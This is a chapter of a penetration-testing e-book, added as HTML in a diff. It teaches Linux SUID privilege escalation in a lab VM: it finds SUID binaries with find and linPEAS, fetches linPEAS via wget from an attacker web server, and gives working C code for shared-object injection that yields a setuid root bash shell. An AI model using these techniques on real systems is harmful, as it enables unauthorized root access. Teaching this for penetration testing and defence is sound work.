@@ -1,0 +1,249 @@
+<html><head></head><body><div id="sbo-rt-content"><div id="_idContainer345">
+			<h1 id="_idParaDest-166"><em class="italic"><a id="_idTextAnchor175"/>Chapter 13</em>: Exploiting SUID Binaries</h1>
+			<p>We will conclude the privilege escalation process on Linux by exploring the process of searching for and exploiting SUID binaries on Linux, which helps elevate the privileges on the target system.</p>
+			<p>We will start this chapter by looking at how filesystem permissions work on Linux, after which we will look at how SUID permissions work and how they are applied. We will then look at how to search for and identify vulnerable or misconfigured SUID binaries, before exploring the various techniques that can be used to exploit improperly configured SUID binaries to elevate our privileges.</p>
+			<p>In this chapter, we're going to cover the following main topics:</p>
+			<ul>
+				<li>Introduction to filesystem permissions on Linux</li>
+				<li>Searching for SUID binaries</li>
+				<li>Escalation via shared object injection</li>
+			</ul>
+			<h1 id="_idParaDest-167"><a id="_idTextAnchor176"/>Technical requirements </h1>
+			<p>To follow along with the demonstrations in this chapter, you will need to ensure that you are familiar with Linux Terminal commands.</p>
+			<p>You can view this chapter's code in action here: <a href="https://bit.ly/39Kdn1t">https://bit.ly/39Kdn1t</a></p>
+			<h1 id="_idParaDest-168"><a id="_idTextAnchor177"/>Introduction to filesystem permissions on Linux</h1>
+			<p>Before we begin exploring the process of exploiting SUID binaries to elevate our privileges, we need to take <a id="_idIndexMarker653"/>a brief look at filesystem permissions on Linux and how they can be used <a id="_idIndexMarker654"/>to provide or limit access to files and directories. This will help us set up the stage for our foray into SUID binaries, how they are configured, and how they can be exploited.</p>
+			<p>Filesystem permissions on Linux are used to grant or limit access to files and directories. This is a very useful feature as it allows users to restrict access to particular files or directories, thus preventing any unauthorized access. </p>
+			<p>We can list the permissions<a id="_idIndexMarker655"/> of a file or folder on Linux by running the following <a id="_idIndexMarker656"/>command:</p>
+			<p class="source-code">ls -al</p>
+			<p>As highlighted in the following screenshot, this command will output a list of all the files in a directory and all their attributes, including their access permissions and ownership details:</p>
+			<div>
+				<div id="_idContainer323" class="IMG---Figure">
+					<img src="Images/B17389_13_001.jpg" alt="Figure 13.1 – File permissions&#13;&#10;" width="1086" height="545"/>
+				</div>
+			</div>
+			<p class="figure-caption">Figure 13.1 – File permissions</p>
+			<p>Linux provides multi-user support. Due to this, access to files and data is restricted based on the following key elements:</p>
+			<ul>
+				<li><strong class="bold">File ownership</strong>: This<a id="_idIndexMarker657"/> refers to the specific user or group that owns the file.</li>
+				<li><strong class="bold">Access permissions</strong>: This refers to the specific permissions <a id="_idIndexMarker658"/>that are used to allow or restrict access to specific files.</li>
+			</ul>
+			<p>Every file and directory on Linux has an owner and specific file permissions that are used to prevent unauthenticated or unauthorized access to it.</p>
+			<p>In the case of ownership, Linux divides file ownership into three main categories:</p>
+			<ul>
+				<li><strong class="bold">User</strong>: This is <a id="_idIndexMarker659"/>used to specify the owner of the file. Typically, the creator of a file becomes the owner of the file.</li>
+				<li><strong class="bold">Group</strong>: This is used<a id="_idIndexMarker660"/> to specify the group ownership or access to a file, whereby all users of a group will have the same permissions and access to the file. Only members of the group will be able to read, write, or execute the file based on the file's access permissions.</li>
+				<li><strong class="bold">Other</strong>: This is used to<a id="_idIndexMarker661"/> refer to read, write, or execute permissions for other users on the system who are not the owner or part of a group that has ownership of the file. </li>
+			</ul>
+			<p>The following screenshot outlines the file ownership categorization of a file on Linux, whereby the access permissions are used to dictate the type of access the owner, group, and other users on the system have to a specific file on the system:</p>
+			<div>
+				<div id="_idContainer324" class="IMG---Figure">
+					<img src="Images/B17389_13_002.jpg" alt="Figure 13.2 – Linux file ownership&#13;&#10;" width="814" height="287"/>
+				</div>
+			</div>
+			<p class="figure-caption">Figure 13.2 – Linux file ownership</p>
+			<p>Now that we have an understanding of how file ownership is handled and implemented on Linux, let's take a look at how access permissions are configured.</p>
+			<p>Every file and directory on Linux has specific access permissions attributed to it that determine whether the file can be read, modified, or executed. Linux divides these access permissions into three categories based on the type of access you wish to provide to users and groups on the system:</p>
+			<ul>
+				<li><strong class="bold">Read</strong>: This permission <a id="_idIndexMarker662"/>provides users with the ability to read a file and is denoted by the letter <strong class="source-inline">r</strong>.</li>
+				<li><strong class="bold">Write</strong>: This permission provides users with the ability to modify or make changes to <a id="_idIndexMarker663"/>a file and is denoted by the letter <strong class="source-inline">w</strong>.</li>
+				<li><strong class="bold">Execute</strong>: This permission provides users with the ability to execute or run a file and is <a id="_idIndexMarker664"/>denoted by the letter <strong class="source-inline">x</strong>.</li>
+			</ul>
+			<p>The following screenshot outlines the access permissions of a particular file for the owner, group, and other users on the system:</p>
+			<div>
+				<div id="_idContainer325" class="IMG---Figure">
+					<img src="Images/B17389_13_003.jpg" alt="Figure 13.3 – File access permissions&#13;&#10;" width="833" height="317"/>
+				</div>
+			</div>
+			<p class="figure-caption">Figure 13.3 – File access permissions</p>
+			<p>In this case, the owner of the file has read, write, and execute permissions and both the group and other users only have read and execute permissions, thus restricting them from making changes to the file.</p>
+			<p>This example demonstrates the importance of file ownership and access permissions on Linux, as well as how they can be used to limit or grant access to files and resources on a system.</p>
+			<h2 id="_idParaDest-169"><a id="_idTextAnchor178"/>Changing permissions</h2>
+			<p>To change file and directory permissions, we can use the <strong class="source-inline">chmod</strong> command, which is an abbreviation for change mode.</p>
+			<p>The syntax of the <strong class="source-inline">chmod</strong> command can be defined by various formats. One of the most commonly used formats is the symbolic mode format. It provides users with a simple and easy-to-understand <a id="_idIndexMarker665"/>syntax for modifying, setting, and removing permissions. The following table shows all the arguments and their corresponding functions:</p>
+			<div>
+				<div id="_idContainer326" class="IMG---Figure">
+					<img src="Images/B17389_13_Table_001.jpg" alt="" width="1218" height="850"/>
+				</div>
+			</div>
+			<p>Let's take a look at how to use <strong class="source-inline">chmod</strong> to modify file and directory permissions.</p>
+			<p>I will be using <a id="_idIndexMarker666"/>a simple Bash script as a test file to demonstrate how permissions can affect access.</p>
+			<p>If we want to add permissions to the file, we can use the <strong class="source-inline">+</strong> symbol. Let's give the script executable permissions. We can do this by using the following syntax:</p>
+			<p class="source-code">chmod +x script.sh</p>
+			<p>If we want to give the executable permission to all users, we can use the following command:</p>
+			<p class="source-code">chmod u+x script.sh</p>
+			<p>We can also use multiple permissions in a single command and use a comma to separate the options. This <a id="_idIndexMarker667"/>command will give groups executable permissions and will give all users and groups write permissions:</p>
+			<p class="source-code">chmod g+x, a+w script.sh</p>
+			<p>If we want to remove permissions from a file, we can use the <strong class="source-inline">-</strong> symbol. This command will remove all the executable permissions for all users. This will prevent the script from being executed:</p>
+			<p class="source-code">chmod a-x script.sh</p>
+			<p>Now that you have a functional understanding of how filesystem permissions work on Linux, we can begin exploring the SUID permission, how it works, and how it is used.</p>
+			<h2 id="_idParaDest-170"><a id="_idTextAnchor179"/>Understanding SUID permissions</h2>
+			<p>In addition to the three main file access permissions (read, write, and execute), Linux also provides <a id="_idIndexMarker668"/>users with specialized permissions that can be utilized in specific situations. One of these access permissions is the <strong class="bold">Set Owner User ID</strong> (<strong class="bold">SUID</strong>) permission. </p>
+			<p>When applied, this permission allows users to execute a script or binary with the permissions of the file owner, as opposed to the user who is running the script or binary.</p>
+			<p>SUID permissions are typically used to provide unprivileged users with the ability to run specific scripts or binaries with <em class="italic">root</em> permissions. However, note that the provision of elevated privileges is <a id="_idIndexMarker669"/>limited to the execution of the script and does not translate to elevated privileges. However, if they haven't been configured properly, unprivileged users can exploit misconfigurations or vulnerabilities within the binary or script to obtain an elevated session.</p>
+			<p>Files or binaries with the SUID access permission can easily be identified by listing the respective ownership permissions of the file. If applied to a file or binary, the execute permission (denoted by the letter <strong class="source-inline">x</strong>) will be replaced with the SUID permission, denoted by the letter <strong class="source-inline">s</strong>, as highlighted in the following screenshot:</p>
+			<div>
+				<div id="_idContainer327" class="IMG---Figure">
+					<img src="Images/B17389_13_004.jpg" alt="Figure 13.4 – SUID permission&#13;&#10;" width="1017" height="145"/>
+				</div>
+			</div>
+			<p class="figure-caption">Figure 13.4 – SUID permission</p>
+			<p>As highlighted in the preceding<a id="_idIndexMarker670"/> screenshot, the owner of the file has the SUID access permission applied, while the members of the group and other users on the system have read and <a id="_idIndexMarker671"/>execute permissions, but not write permissions. In this case, the members of the group and other users on the system will be able to execute the binary with root privileges, since the owner of the file is the root user.</p>
+			<p>This permission can be <a id="_idIndexMarker672"/>extremely useful as it provides administrators with granular control over files or binaries, who can access them, whether they can be executed, and the permissions they will be executed with.</p>
+			<p>This is the functionality that we will be attempting to exploit in this chapter to elevate our privileges. However, as you have probably noticed, the success of our attack will depend on the following factors:</p>
+			<ul>
+				<li><strong class="bold">Owner of the SUID binary</strong>: Given that we are attempting to elevate our privileges, we will <a id="_idIndexMarker673"/>only be exploiting SUID binaries that are owned by the root user or other privileged users.</li>
+				<li><strong class="bold">Access permissions</strong>: We will require <a id="_idIndexMarker674"/>executable permissions to execute the SUID binary.</li>
+			</ul>
+			<p>Now that we have an understanding of how SUID permissions work, let's take a look at how to search for and identify SUID binaries on the target system.</p>
+			<h1 id="_idParaDest-171"><a id="_idTextAnchor180"/>Searching for SUID binaries</h1>
+			<p>The process of searching for and identifying SUID binaries on the target system can be performed both <a id="_idIndexMarker675"/>manually and automatically. We will look at how to do both as it is vitally important to know how to search for SUID binaries manually, in the event you are working in a restricted environment that is not conducive for running automated tools.</p>
+			<p>In this chapter, we will be utilizing the VM we set up in <a href="B17389_11_Final_PG_ePub.xhtml#_idTextAnchor152"><em class="italic">Chapter 11</em></a>, <em class="italic">Linux Password Mining</em>.</p>
+			<p>We will begin by learning how to search for SUID binaries manually by utilizing built-in Linux utilities.</p>
+			<h2 id="_idParaDest-172"><a id="_idTextAnchor181"/>Searching for SUID binaries manually</h2>
+			<p>You can search for SUID binaries manually by utilizing the built-in <strong class="source-inline">find</strong> utility on Linux. This allows you to search for SUID binaries on the target system. To do so, run the following command:</p>
+			<p class="source-code">find / -type f -perm -u=s -ls 2&gt;/dev/null</p>
+			<p>This command will search for files that have the SUID access permission set for the file owner and will <a id="_idIndexMarker676"/>display the respective owner of each file or binary.</p>
+			<p>As highlighted in the following screenshot, we can identify quite a few binaries that have SUID permissions. In this case, they are all owned by the root user:</p>
+			<div>
+				<div id="_idContainer328" class="IMG---Figure">
+					<img src="Images/B17389_13_005.jpg" alt="Figure 13.5 – Searching for SUID binaries manually&#13;&#10;" width="1240" height="566"/>
+				</div>
+			</div>
+			<p class="figure-caption">Figure 13.5 – Searching for SUID binaries manually</p>
+			<p>The next logical step would be to identify the SUID binaries that can be exploited to elevate our privileges. However, before we can do that, we need to explore the process of searching for SUID binaries automatically.</p>
+			<h2 id="_idParaDest-173"><a id="_idTextAnchor182"/>Searching for SUID binaries with linPEAS</h2>
+			<p>We can automate <a id="_idIndexMarker677"/>the process of searching for SUID binaries <a id="_idIndexMarker678"/>by utilizing automated enumeration tools. In this case, we will utilize the <strong class="bold">linPEAS</strong> script to enumerate information from our target.</p>
+			<p class="callout-heading">Note</p>
+			<p class="callout">linPEAS is a local Linux enumeration script that searches and scans for potential vulnerabilities, and also <a id="_idIndexMarker679"/>enumerates all important system information that can be used to stage a privilege escalation attack.</p>
+			<p>The linPEAS binary <a id="_idIndexMarker680"/>can be downloaded from the following GitHub repository: <a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS">https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS</a>.</p>
+			<p>Ensure you download the <strong class="source-inline">linpeas.sh</strong> Bash script, as highlighted in the following screenshot:</p>
+			<div>
+				<div id="_idContainer329" class="IMG---Figure">
+					<img src="Images/B17389_13_006.jpg" alt="Figure 13.6 – linPEAS Bash script&#13;&#10;" width="496" height="239"/>
+				</div>
+			</div>
+			<p class="figure-caption">Figure 13.6 – linPEAS Bash script</p>
+			<p>After downloading the Bash script to our Kali VM, we need to transfer the <strong class="source-inline">linpeas.sh</strong> file to our target VM. This cannot be done automatically as we do not <a id="_idIndexMarker681"/>have a Meterpreter session. As a result, we will <a id="_idIndexMarker682"/>need to make use of Linux-specific utilities to download the binary.</p>
+			<p>To transfer the <strong class="source-inline">linpeas.sh</strong> file to our target, we will need to set up a web server on our Kali VM that will be used to host the file. This will allow us to download it on the target system. This can be done by following these steps:</p>
+			<ol>
+				<li>To set up a web server on our Kali VM, we can utilize the <strong class="source-inline">SimpleHTTPServer</strong> Python module to serve the script. This can be done by running the following command in the directory where the <strong class="source-inline">linpeas.sh</strong> binary is stored:<p class="source-code"><strong class="bold">sudo python -m SimpleHTTPServer 80</strong></p><p class="callout-heading">Note</p><p class="callout"><strong class="source-inline">SimpleHTTPServer</strong> is a Python module for Python2 that is also available as <strong class="source-inline">http.server</strong> for Python3.</p><p>As highlighted in the following screenshot, the <strong class="source-inline">SimpleHTTPServer</strong> module will serve the files in the directory on the Kali VM IP address on port <strong class="source-inline">80</strong>:</p><div id="_idContainer330" class="IMG---Figure"><img src="Images/B17389_13_007.jpg" alt="Figure 13.7 – SimpleHTTPServer linpeas&#13;&#10;" width="601" height="250"/></div><p class="figure-caption">Figure 13.7 – SimpleHTTPServer linpeas</p></li>
+				<li>To download the <strong class="source-inline">linpeas.sh</strong> file on the target system, we can utilize the <strong class="source-inline">wget</strong> utility. Before we can download the binary, however, we need to navigate to a directory where we have read and write permissions. In this case, we will navigate to the temporary directory, as illustrated in the<a id="_idIndexMarker683"/> following screenshot:<div id="_idContainer331" class="IMG---Figure"><img src="Images/B17389_13_008.jpg" alt="Figure 13.8 – Linux temporary directory&#13;&#10;" width="309" height="93"/></div><p class="figure-caption">Figure 13.8 – Linux temporary directory</p></li>
+				<li>We can now use the <strong class="source-inline">wget</strong> utility <a id="_idIndexMarker684"/>to download the file from the Kali VM to our target system. This can be done by running the following command on the target system:<p class="source-code"><strong class="bold">wget http://&lt;KALI-VM-IP&gt;/linpeas.sh</strong></p><p>The output is shown in the following screenshot:</p></li>
+			</ol>
+			<div>
+				<div id="_idContainer332" class="IMG---Figure">
+					<img src="Images/B17389_13_009.jpg" alt="Figure 13.9 – wget linpeas" width="1416" height="403"/>
+				</div>
+			</div>
+			<p class="figure-caption">Figure 13.9 – wget linpeas</p>
+			<p>As shown in the preceding screenshot, if the transfer is successful, the <strong class="source-inline">linpeas.sh</strong> file should be downloaded and saved with the name we specified.</p>
+			<p>The <strong class="source-inline">linpeas.sh</strong> script enumerates a lot of information and will perform various checks to discover potential vulnerabilities on the target system. We can use the <strong class="source-inline">linpeas.sh</strong> script to enumerate and locate SUID binaries on the target system. </p>
+			<p>To enumerate all <a id="_idIndexMarker685"/>important system information, we need to run the <strong class="source-inline">linpeas.sh</strong> script. However, before we do that, we<a id="_idIndexMarker686"/> need to ensure the script has executable permissions. This can be done by running the following command on the target:</p>
+			<p class="source-code">chmod +x linpeas.sh</p>
+			<p>We can now run the <strong class="source-inline">linpeas.sh</strong> script by running the following command on the target:</p>
+			<p class="source-code">./linpeas.sh</p>
+			<p>As highlighted in the following screenshot, the script will enumerate system information and display a list of SUID binaries on the target system:</p>
+			<div>
+				<div id="_idContainer333" class="IMG---Figure">
+					<img src="Images/B17389_13_010.jpg" alt="Figure 13.10 – linPEAS SUID binaries&#13;&#10;" width="1225" height="474"/>
+				</div>
+			</div>
+			<p class="figure-caption">Figure 13.10 – linPEAS SUID binaries</p>
+			<p>In this case, we can identify the same SUID binaries we found with our manual search. However, linPEAS also provides us with additional information regarding potential vulnerabilities for each SUID binary that can be exploited. This information will come in handy in the upcoming sections of this chapter.</p>
+			<p>Now that we have been able to search for and identify all the SUID binaries on the target system, we can start exploring the process of identifying the SUID binaries that are vulnerable and can be exploited.</p>
+			<h2 id="_idParaDest-174"><a id="_idTextAnchor183"/>Identifying vulnerable SUID binaries</h2>
+			<p>Identifying vulnerable SUID binaries that can be exploited to provide us with elevated privileges can be a <a id="_idIndexMarker687"/>very manual process and differs from system to system, based on the SUIDs that are available. However, we can streamline this process by utilizing a resource called <strong class="bold">GTFOBins</strong>.</p>
+			<p>GTFOBins is a curated list <a id="_idIndexMarker688"/>of Unix binaries that can be exploited to bypass local security restrictions and, in our case, elevate our privileges.</p>
+			<p>More information <a id="_idIndexMarker689"/>about GTFOBins can be found here: <a href="https://gtfobins.github.io/">https://gtfobins.github.io/</a>.</p>
+			<p>We can use the information outlined on the GTFOBins website to identify binaries on our target system that can be exploited to elevate our privileges.</p>
+			<p>The GTFOBins website has a dedicated SUID category that provides us with a list of SUID binaries that are vulnerable and can be accessed by clicking on the SUID category, as highlighted in the following screenshot:</p>
+			<div>
+				<div id="_idContainer334" class="IMG---Figure">
+					<img src="Images/B17389_13_011.jpg" alt="Figure 13.11 – GTFOBins SUID category" width="906" height="495"/>
+				</div>
+			</div>
+			<p class="figure-caption">Figure 13.11 – GTFOBins SUID category</p>
+			<p>The SUID category <a id="_idIndexMarker690"/>will provide you with an alphabetically sorted list of vulnerable SUID binaries and their respective functions, as highlighted in the following screenshot:</p>
+			<div>
+				<div id="_idContainer335" class="IMG---Figure">
+					<img src="Images/B17389_13_012.jpg" alt="Figure 13.12 – GTFOBins vulnerable SUID binaries&#13;&#10;" width="802" height="502"/>
+				</div>
+			</div>
+			<p class="figure-caption">Figure 13.12 – GTFOBins vulnerable SUID binaries</p>
+			<p>We can use this list of vulnerable<a id="_idIndexMarker691"/> SUID binaries to identify any potential matches with the SUID binaries on our target system. However, in our case, we weren't able to identify any matches. As a result, we will have to analyze the SUID binaries on the target system to identify any potential vulnerabilities that can be exploited.</p>
+			<p>Also, note that you should not disregard the GTFOBins resource in your future assessments as you may come across targets that do have a vulnerable SUID binary that can be exploited.</p>
+			<p>In this case, we will have to take on a much more manual approach that will require analyzing the SUID binaries on the target system.</p>
+			<h1 id="_idParaDest-175"><a id="_idTextAnchor184"/>Escalation via shared object injection</h1>
+			<p>In the previous section, <em class="italic">Searching for SUID binaries</em>, we identified the SUID binaries on the target system with linPEAS. However, in addition to listing the SUID binaries, linPEAS also <a id="_idIndexMarker692"/>performed additional vulnerability <a id="_idIndexMarker693"/>checks on the SUID binaries to determine whether they can be exploited.</p>
+			<p>Analyzing the linPEAS results closely reveals that linPEAS executes and checks the binaries with the <strong class="source-inline">strace</strong> utility to identify the shared objects utilized by the binary.</p>
+			<p class="callout-heading">Note</p>
+			<p class="callout"><strong class="source-inline">strace</strong> is a Linux utility that is used to monitor and debug applications and processes and their <a id="_idIndexMarker694"/>interaction with the Linux kernel.</p>
+			<p>linPEAS runs each SUID binary with <strong class="source-inline">strace</strong> to identify the shared objects that are used by the binary and <a id="_idIndexMarker695"/>lists their <a id="_idIndexMarker696"/>respective locations, as highlighted in the following screenshot:</p>
+			<div>
+				<div id="_idContainer336" class="IMG---Figure">
+					<img src="Images/B17389_13_013.jpg" alt="Figure 13.13 – linPEAS shared objects" width="1248" height="464"/>
+				</div>
+			</div>
+			<p class="figure-caption">Figure 13.13 – linPEAS shared objects</p>
+			<p>As highlighted in the preceding screenshot, we can identify the <strong class="source-inline">suid-so</strong> binary as a potential target as it utilizes several shared objects that do not exist on the target system. However, one specific shared object file should have caught your attention: the <strong class="source-inline">suid-so</strong> binary utilizes a shared object named <strong class="source-inline">libcalc.so</strong> that is stored in the <strong class="source-inline">user</strong> account's home directory.</p>
+			<p class="callout-heading">Note</p>
+			<p class="callout">Shared objects are the Linux equivalent of <strong class="bold">Dynamically Linked Libraries</strong> (<strong class="bold">DLLs</strong>) on Windows and <a id="_idIndexMarker697"/>are used by Linux applications to provide additional functionality.</p>
+			<p>Given that we are currently logged on to the target system as the <strong class="source-inline">user</strong> account, we should be able to modify the shared library that is being utilized by the SUID binary to execute arbitrary commands. In our case, this will provide us with an elevated session when the <strong class="source-inline">suid-so</strong> binary is executed.</p>
+			<p>This attack works quite similarly to the Windows DLL injection technique, where we replaced the <a id="_idIndexMarker698"/>target DLL with a modified one that provided us with an elevated reverse shell when the target<a id="_idIndexMarker699"/> service was executed.</p>
+			<p>Before we begin the exploitation phase, we should analyze what the <strong class="source-inline">suid-so</strong> binary does by executing it, given that the binary is stored in the <strong class="source-inline">/usr/local/bin</strong> directory. We can execute it directly by running the following command:</p>
+			<p class="source-code">suid-so</p>
+			<p>Running the binary does not reveal any useful information as it simply performs a calculation and provides a progress bar for the calculation, as highlighted in the following screenshot:</p>
+			<div>
+				<div id="_idContainer337" class="IMG---Figure">
+					<img src="Images/B17389_13_014.jpg" alt="Figure 13.14 – Executing an SUID binary&#13;&#10;" width="1007" height="135"/>
+				</div>
+			</div>
+			<p class="figure-caption">Figure 13.14 – Executing an SUID binary</p>
+			<p>Alternatively, we can analyze what shared objects the binary uses manually with the <strong class="source-inline">strace</strong> utility as opposed to using automated tools. This can be done by running the following command:</p>
+			<p class="source-code">strace /usr/local/bin/suid-so 2&gt;&amp;1 | grep -i -E "open|access|no such file"</p>
+			<p>This command will run the <strong class="source-inline">suid-so</strong> binary with the <strong class="source-inline">strace</strong> utility and limit the output produced by <strong class="source-inline">strace</strong> with grep, This will ensure that only the shared objects that have been utilized by the binary are displayed:</p>
+			<div>
+				<div id="_idContainer338" class="IMG---Figure">
+					<img src="Images/B17389_13_015.jpg" alt="Figure 13.15 – strace SUID binary shared objects&#13;&#10;" width="1163" height="424"/>
+				</div>
+			</div>
+			<p class="figure-caption">Figure 13.15 – strace SUID binary shared objects</p>
+			<p>As highlighted in the preceding screenshot, we can identify the <strong class="source-inline">libcal.so</strong> shared object in the <strong class="source-inline">user</strong> account's home directory, as we did when we used the linPEAS script.</p>
+			<p>We can also <a id="_idIndexMarker700"/>search for<a id="_idIndexMarker701"/> useful strings in the binary by using the built-in <strong class="source-inline">strings</strong> utility. This can be done by running the following command:</p>
+			<p class="source-code">strings /usr/local/bin/suid-so</p>
+			<p>As highlighted in the following screenshot, the <strong class="source-inline">strings</strong> utility will output a list of strings that were found in the <strong class="source-inline">suid-so</strong> binary:</p>
+			<div>
+				<div id="_idContainer339" class="IMG---Figure">
+					<img src="Images/B17389_13_016.jpg" alt="Figure 13.16 – Finding useful strings&#13;&#10;" width="499" height="392"/>
+				</div>
+			</div>
+			<p class="figure-caption">Figure 13.16 – Finding useful strings</p>
+			<p>In this case, we can determine that the application utilizes the <strong class="source-inline">libcalc.so</strong> shared object in the <strong class="source-inline">user</strong> account's home directory. The <strong class="source-inline">strings</strong> utility can prove to be very useful if you do not have access to the <strong class="source-inline">strace</strong> utility or any automated enumeration scripts such as linPEAS.</p>
+			<p>Now that we have an idea of what the <strong class="source-inline">suid-so</strong> binary does, what shared objects it utilizes, and have identified a vulnerable shared object, we can begin the privilege escalation process.</p>
+			<p>The privilege escalation process can be performed by following these steps:</p>
+			<ol>
+				<li value="1">The first step in this process involves checking whether the <strong class="source-inline">libcalc.so</strong> file exists. This can <a id="_idIndexMarker702"/>be done by listing the contents of the <strong class="source-inline">user</strong> account's home directory:<p class="source-code"><strong class="bold">ls -al /home/user/</strong></p><p>As shown in the following screenshot, the user account's home directory does not contain the <strong class="source-inline">.config</strong> directory, which contains the <strong class="source-inline">libcalc.so</strong> shared object file. As a result, we will have to create the <strong class="source-inline">.config</strong> directory and compile the shared object file ourselves:</p><div id="_idContainer340" class="IMG---Figure"><img src="Images/B17389_13_017.jpg" alt="Figure 13.17 – The user's home directory&#13;&#10;" width="1009" height="498"/></div><p class="figure-caption">Figure 13.17 – The user's home directory</p></li>
+				<li>We can create the <strong class="source-inline">.config</strong> directory in the <strong class="source-inline">user</strong> account's home directory by running the following command:<p class="source-code"><strong class="bold">mkdir /home/user/.config</strong></p><p>Once we have created the <strong class="source-inline">.config</strong> directory, we need to create the <strong class="source-inline">libcalc.c</strong> file. This can be done by running the following command:</p><p class="source-code"><strong class="bold">touch /home/user/.config/libcalc.c</strong></p></li>
+				<li>The next step involves adding our custom C code to the <strong class="source-inline">libcalc.c</strong> file that we will compile. Open the <strong class="source-inline">libcalc.c</strong> file we just created with your terminal text <a id="_idIndexMarker703"/>editor of choice. In my case, I will use VIM and add the following C code:<p class="source-code">#include &lt;stdio.h&gt;</p><p class="source-code">#include &lt;stdlib.h&gt;</p><p class="source-code">static void inject() __attribute__((constructor));</p><p class="source-code">void inject() {</p><p class="source-code">system("cp /bin/bash /tmp/bash &amp;&amp; chmod +s /tmp/bash &amp;&amp; /tmp/bash -p");</p><p class="source-code">}</p><p>This C code utilizes a custom function called <strong class="source-inline">inject</strong> that runs a system command that copies the Bash binary into the Linux <strong class="source-inline">temp</strong> directory. After doing this, it will assign SUID permissions to the Bash binary and execute it from the <strong class="source-inline">temp</strong> directory. Because the <strong class="source-inline">suid-so</strong> binary runs as the root user and calls the <strong class="source-inline">libcalc.so</strong> shared object, the custom <strong class="source-inline">libcalc.so</strong> shared object file will also be executed with root permissions and provide us with an elevated Bash session.</p><p class="callout-heading">Note</p><p class="callout">You can also use your own C reverse shellcode in <strong class="source-inline">libcalc.c</strong>, which will connect to a reverse listener and provide you with an elevated reverse shell.</p><p>Once you have added the custom code, ensure that you indent it correctly, as shown in the following screenshot:</p><div id="_idContainer341" class="IMG---Figure"><img src="Images/B17389_13_018.jpg" alt="Figure 13.18 – Custom libcalc.c code&#13;&#10;" width="1032" height="220"/></div><p class="figure-caption">Figure 13.18 – Custom libcalc.c code</p><p>After indenting <a id="_idIndexMarker704"/>and formatting the code accordingly, ensure that you save it before continuing. Now, we need to compile the <strong class="source-inline">libcalc.c</strong> file so that we have the <strong class="source-inline">libcalc.so</strong> shared object file.</p></li>
+				<li>We can compile the custom <strong class="source-inline">libcalc.c</strong> file with <strong class="bold">Gnu C Compiler</strong> (<strong class="bold">GCC</strong>) by running the following command:<p class="source-code"><strong class="bold">gcc -shared -o /home/user/.config/libcalc.so -fPIC /home/user/.config/libcalc.c</strong></p><p>This command will compile the custom <strong class="source-inline">libcalc.c</strong> file and provide us with the custom <strong class="source-inline">libcalc.so</strong> shared object file, which will provide us with an elevated session.</p><p class="callout-heading">Note</p><p class="callout">When compiling our custom code with the GNU C Compiler (<strong class="source-inline">gcc</strong>), we used the <strong class="source-inline">-fPIC</strong> flag, which ensures <a id="_idIndexMarker705"/>that the code in our shared library is position-independent and can be loaded by any address in memory.</p><p>After compiling the <strong class="source-inline">libcalc.c</strong> file, you should now have the custom <strong class="source-inline">libcalc.so</strong> file in the <strong class="source-inline">user</strong> account's home directory, as highlighted in the following screenshot:</p><div id="_idContainer342" class="IMG---Figure"><img src="Images/B17389_13_019.jpg" alt="Figure 13.19 – Compiled libcalc.so shared object&#13;&#10;" width="1234" height="214"/></div><p class="figure-caption">Figure 13.19 – Compiled libcalc.so shared object</p><p>Now that we have our custom <strong class="source-inline">libcalc.so</strong> shared file ready, we can execute the <strong class="source-inline">suid-so</strong> binary.</p></li>
+				<li>To execute the custom <strong class="source-inline">libcalc.so</strong> shared object file, we need to execute the <strong class="source-inline">suid-so</strong> binary. This can be done by running the following command:<p class="source-code"><strong class="bold">suid-so</strong></p><p>If you have <a id="_idIndexMarker706"/>followed the previous steps correctly, running the <strong class="source-inline">suid-so</strong> binary should provide you with a Bash session, as highlighted in the following screenshot:</p><div id="_idContainer343" class="IMG---Figure"><img src="Images/B17389_13_020.jpg" alt="Figure 13.20 – Bash session" width="621" height="102"/></div><p class="figure-caption">Figure 13.20 – Bash session</p></li>
+				<li>We can confirm that we have an elevated session with root access by running the following command:<p class="source-code"><strong class="bold">id</strong></p><p>Alternatively, you can identify the user you are currently logged on as by running the following command:</p><p class="source-code"><strong class="bold">whoami</strong></p><p>As highlighted in the following screenshot, we should have an elevated session as the root user:</p></li>
+			</ol>
+			<div>
+				<div id="_idContainer344" class="IMG---Figure">
+					<img src="Images/B17389_13_021.jpg" alt="Figure 13.21 – Elevated Bash session&#13;&#10;" width="1152" height="198"/>
+				</div>
+			</div>
+			<p class="figure-caption">Figure 13.21 – Elevated Bash session</p>
+			<p>With that, we successfully elevated our privileges by exploiting an improperly configured SUID binary, which utilized a shared object file that was stored in an unprivileged <a id="_idIndexMarker707"/>user account's home directory.</p>
+			<p>Various techniques can be used to exploit SUID binaries. However, the most important factor in this process involves thoroughly enumerating and gathering as much information as possible from the target SUID, and then analyzing it for potential misconfigurations or vulnerabilities. This process will differ from target to target and, as a result, requires a keen eye and a methodological approach to help identify misconfigurations or vulnerabilities in SUID binaries.</p>
+			<h1 id="_idParaDest-176"><a id="_idTextAnchor185"/>Summary</h1>
+			<p>In this chapter, we started by looking at how filesystem permissions work on Linux and how SUID permissions are used. We then took an in-depth look at how to search for and identify SUID binaries on the target system, both manually and automatically. We also briefly explored the process of identifying vulnerable SUID binaries, before looking at how to elevate our privileges by exploiting misconfigured SUID binaries.</p>
+			<p>If you have made it this far, congratulations! You should now be well-versed in elevating your privileges on both Windows and Linux by leveraging and exploiting various vulnerabilities on both operating systems. </p>
+			<p>If this was your initial foray into the process of privilege escalation, you should now have the necessary skills to identify and exploit vulnerabilities on target systems to elevate your privileges.</p>
+			<p>This book was designed to be a practical guide on how to enumerate as much information as possible from Windows and Linux targets, as well as how to use this information to identify vulnerabilities that can be exploited to elevate your privileges. This book sought to accomplish this by providing practical exercises that tested and verified what you learned in each chapter. </p>
+			<p>This book covered all of the most important privilege escalation vectors for both Windows and Linux systems, and it also provided you with real-world scenarios where these vectors can be exploited.</p>
+			<p>I hope you enjoyed this book, found value in every chapter, regardless of your skill level, and have been able to improve your privilege escalation skills to enhance your skillset as a penetration tester.</p>
+		</div>
+	</div></body></html>
